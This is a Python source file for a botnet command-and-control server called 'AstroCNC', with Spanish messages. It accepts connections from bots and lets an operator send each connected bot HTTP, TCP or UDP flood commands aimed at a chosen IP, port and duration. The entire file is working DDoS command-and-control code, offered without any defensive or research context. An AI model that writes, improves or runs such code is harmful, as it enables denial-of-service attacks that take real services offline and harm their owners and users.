#!/usr/bin/env python3
import socket
import threading
import time

class AstroCNC:
    def __init__(self, port=1337):
        self.port = port
        self.bots = []
        self.lock = threading.Lock()
    
    def start(self):
        """Inicia el servidor y la interfaz de comandos"""
        server_thread = threading.Thread(target=self.run_server)
        server_thread.daemon = True
        server_thread.start()
        
        print(f"\n[+] AstroCNC iniciado en puerto {self.port}")
        print("[+] Comandos disponibles: bots, attack, exit\n")
        self.cmd_interface()

    def run_server(self):
        """Escucha conexiones de bots"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', self.port))
        s.listen(5)
        
        while True:
            conn, addr = s.accept()
            with self.lock:
                self.bots.append(conn)
            print(f"[+] Bot conectado: {addr[0]}")

    def cmd_interface(self):
        """Interfaz de comandos del CNC"""
        while True:
            cmd = input("astrocnc> ").strip().lower()
            
            if cmd == "bots":
                print(f"\n[+] Bots conectados: {len(self.bots)}")
            
            elif cmd == "attack":
                target = input("Target IP: ")
                port = input("Port: ")
                time = input("Time (sec): ")
                method = input("Method (http/tcp/udp): ").upper()
                
                if method not in ["HTTP", "TCP", "UDP"]:
                    print("[!] Método inválido")
                    continue
                
                attack_cmd = f"!{method} {target} {port} {time}\n"
                with self.lock:
                    for bot in self.bots:
                        try:
                            bot.send(attack_cmd.encode())
                        except:
                            self.bots.remove(bot)
                print(f"[+] Ataque {method} enviado a {len(self.bots)} bots")
            
            elif cmd == "exit":
                print("[+] Saliendo...")
                break
            
            else:
                print("[!] Comando desconocido")

if __name__ == "__main__":
    cnc = AstroCNC(port=1337)
    cnc.start()
